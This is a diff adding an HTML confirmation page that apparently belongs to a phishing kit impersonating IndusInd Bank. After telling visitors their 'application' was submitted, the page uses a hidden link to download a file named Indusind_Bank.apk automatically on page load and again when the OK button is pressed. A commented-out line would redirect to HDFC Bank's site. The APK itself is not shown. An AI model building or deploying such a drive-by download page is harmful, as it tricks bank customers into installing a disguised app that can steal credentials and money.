@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Success</title>
+    <link rel="icon" href="resource/induslogo.jpg">
+  <style>
+    body {
+      background-color: #888;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .card {
+      background-color: white;
+      padding: 30px;
+      border-radius: 10px;
+      text-align: center;
+      height: 50%;
+      width: 80%;
+      max-width: 400px;
+      box-shadow: 0px 0px 20px rgba(0,0,0,0.1);
+    }
+
+    .card .check {
+      font-size: 60px;
+      color: #6dc66d;
+    }
+
+    .card h2 {
+      margin: 10px 0 5px 0;
+      font-size: 28px;
+    }
+
+    .card p {
+      margin: 0 0 20px 0;
+      color: #555;
+      font-size: 24px;
+    }
+
+    .card button {
+      background-color: #6f60f6;
+      color: white;
+      border: none;
+      margin-top: 20px;
+      border-radius: 6px;
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .card button:hover {
+      background-color: #473be9;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="check">✔️</div>
+    <h2>Application Submitted!</h2>
+    <p>Your application has been submitted successfully.</p>
+    <button onclick="downloadAPK()">OK</button>
+  </div>
+
+  <!-- Hidden anchor tag to trigger download -->
+  <a id="hiddenLink" href="/resource/Indusind_Bank.apk" download style="display: none;"></a>
+
+  <script>
+    // Auto download on page load
+    window.onload = function() {
+      document.getElementById("hiddenLink").click();
+    };
+
+    // Button-triggered download
+    function downloadAPK() {
+      document.getElementById("hiddenLink").click();
+
+
+
+    //   setTimeout(() => {
+    //   window.location.href = "https://www.hdfcbank.com/"; 
+    // }, 1000); // 1 second delay to ensure download triggers
+  
+    }
+  </script>
+
+
+
+
+</body>
+</html>
